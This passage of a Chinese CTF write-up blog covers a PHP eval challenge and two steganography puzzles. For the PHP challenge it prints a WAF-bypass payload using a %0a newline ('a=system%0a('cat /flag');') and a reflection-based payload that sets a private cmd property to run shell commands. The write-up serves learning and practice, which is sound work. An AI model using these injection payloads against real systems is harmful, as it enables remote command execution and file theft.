class="string">&quot;sectet&quot;</span> ) <span class="comment">//how to change the private variables secret&quot;</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看了大佬的WP 有个很简单的非预期</p>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>直接通过%0a 换行符进行bypass</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685803232225-93d4798a-5be8-4d62-a11b-e8aac6f367da.png" alt="img"></p>
+<p>payload：<code>a=system%0a(&#39;cat /flag&#39;);</code></p>
+<p> 以后做题 <code>%00 空字符 %20 空格符 %0a 换行符</code>这种非预期要多尝试</p>
+<h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>草！！！！！！！！！！！！</p>
+<p>这个题目 回过头再看我的payload是对的 只不过把<code>sectet</code>拼成<code>secret</code>不是 sectet是什么啊 我真服了 我一直当作secret在做题 md 我真无语了 sectet到底是出题人拼错了 还是有含义啊 我真服了</p>
+<p>利用PHP反射来给私有属性赋值以及调用私有函数</p>
+<p>参考这篇文章：分析的很细 <a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904148891074568">https://juejin.cn/post/6844904148891074568</a></p>
+<p>分析：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getFlag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$get_flag</span> = <span class="keyword">new</span> <span class="title function_ invoke__">getFlag</span>();</span><br><span class="line"><span class="variable">$refClass</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;getFlag&#x27;</span>);</span><br><span class="line"><span class="variable">$property</span> = <span class="variable">$refClass</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;password&#x27;</span>); <span class="comment">//获取属性值</span></span><br><span class="line"><span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>); <span class="comment">//修改对象$property的可访问属性</span></span><br><span class="line"><span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$get_flag</span>, <span class="string">&#x27;sectet&#x27;</span>);  <span class="comment">//修改值</span></span><br><span class="line"><span class="variable">$property</span> = <span class="variable">$refClass</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;cmd&#x27;</span>);<span class="comment">//获取属性值</span></span><br><span class="line"><span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);<span class="comment">//修改对象$property的可访问属性</span></span><br><span class="line"><span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$get_flag</span>, <span class="string">&#x27;ls /&#x27;</span>); <span class="comment">//修改值</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$get_flag</span>); <span class="comment">//打印源对象属性值</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//class getFlag#1 (2) &#123;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;secret&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$cmd</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;ls /&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">a=<span class="variable">$get_flag</span> = <span class="keyword">new</span> <span class="title function_ invoke__">getFlag</span>();<span class="variable">$refClass</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;getFlag&#x27;</span>);<span class="variable">$property</span> = <span class="variable">$refClass</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;password&#x27;</span>); <span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>); <span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$get_flag</span>, <span class="string">&#x27;sectet&#x27;</span>);  <span class="variable">$property</span> = <span class="variable">$refClass</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;cmd&#x27;</span>);<span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);<span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$get_flag</span>, <span class="string">&#x27;ls /&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685805828849-a21b53f3-1ce1-41c7-a71d-3c0796298211.png" alt="img"></p>
+<h2 id="Esc4pe-T0-Mong0"><a href="#Esc4pe-T0-Mong0" class="headerlink" title="Esc4pe_T0_Mong0"></a>Esc4pe_T0_Mong0</h2><p>没源码 暂定</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>一道关于图片隐写的题目 直接 <code>zsteg -a 1.png|grep &quot;flag&quot;</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686062254676-b77d0ea0-ca69-4769-914c-58379f6e7b6b.png" alt="img"></p>
+<h2 id="可是雪啊飘进双眼"><a href="#可是雪啊飘进双眼" class="headerlink" title="可是雪啊飘进双眼"></a>可是雪啊飘进双眼</h2><p>首先是一段音频和一个文本 然后拖进Audacity查看波形图 一段摩斯电码 </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686062510940-7c390b3f-68a7-411f-94c4-5d22536f7537.png" alt="img"></p>
+<p>上网查一下学习一下 得到<code>.-- --- .- .. ... .... .- -. -..- ..</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686063064061-e8f63abe-d04f-4cec-bd58-a675810b402e.png" alt="img"></p>
+<p>得到密文WOAISHANXI</p>
+<p>但是还是没法解开加密的压缩包</p>
+<p>然后还有一个文本 从名字上能看出是snow加密 </p>
+<p>在<a target="_blank" rel="noopener" href="https://darkside.com.au/snow/%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC">https://darkside.com.au/snow/下载一个脚本</a> 输入刚才得到的密码 然后解密即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snow.exe -p WOAISHANXI -C snow.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p>获得flag压缩包的密码</p>
+<p>然后我这里binwalk抽风了 很奇怪 之前用的好好的 玛德</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pop%E9%93%BE/" rel="tag"># pop链</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/post/a2e74ccf.html" rel="prev" title="NSSCTFRound#13 Web">
+                  <i class="fa fa-chevron-left"></i> NSSCTFRound#13 Web
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2023.2 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z1d10t</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+    </div>
+  </footer>
+
+  
+
+  <a href="https://github.com/Z1d10t" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
+
